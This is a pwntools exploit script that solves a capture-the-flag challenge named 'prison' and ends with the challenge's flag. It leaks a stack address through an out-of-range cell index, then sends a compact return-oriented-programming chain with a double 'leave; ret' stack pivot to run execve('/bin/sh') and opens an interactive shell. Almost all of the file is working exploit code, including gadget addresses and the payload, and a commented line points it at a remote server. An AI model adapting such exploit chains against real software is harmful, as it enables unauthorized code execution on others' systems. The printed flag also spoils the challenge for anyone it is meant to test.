from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./prison', '''
    b *(prison+249)
    b *(prison+309)
    continue
''')

# p = remote('20.84.72.194', 5001)

# 1. leak current rbp value
p.sendlineafter(b"They gave you the premium stay so at least you get to choose your cell (1-6): ", b'9')
p.recvuntil(b"Your cellmate is ")
# print out saved rbp value
saved_rbp_val = u64(p.recvline().strip().ljust(8, b'\x00'))
# calculate current rbp value
current_rbp_val = saved_rbp_val-0x10
log.info(f"current rbp value: {hex(current_rbp_val)}")

# 2. ROP to stack pivot to call execve("/bin/sh", 0, 0)
# this payload is read in by fgets, which has a 0x64 limited size
# ROP chain must be as short as possible
# key idea is to use "leave; ret;" twice to perform stack pivot to arbitrary saved rbp value
GADGET_1 = 0x41f464  # pop rax; ret;
GADGET_2 = 0x401a0d  # pop rdi; ret;
GADGET_3 = 0x413676  # pop rsi; pop rbp; ret;
GADGET_4 = 0x41a4b6  # syscall; ret;
GADGET_5 = 0x401b54  # leave; ret; (mov rsp, rbp; pop rbp; ret)
GADGET_START_ADDR = current_rbp_val-0x40
BINSH_ADDR = current_rbp_val+0x10
FAKE_RBP = 0x4cc000
chain = [
    GADGET_1, 59,  # rax=59 (execve)
    GADGET_2, BINSH_ADDR,  # rdi=BINSH_ADDR
    GADGET_3, 0, FAKE_RBP,  # rsi=0, rbp=FAKE_RBP
    # rdx=0 already, no need to set
    GADGET_4  # syscall execve("/bin/sh", 0, 0)
]
p.sendlineafter(b"What is your name: ", b''.join(p64(c) for c in chain)+p64(GADGET_START_ADDR-8)+p64(GADGET_5)+b'/bin/sh\x00')

p.interactive()

# squ1rrel{m4n_0n_th3_rUn_fr0m_NX_pr1s0n!}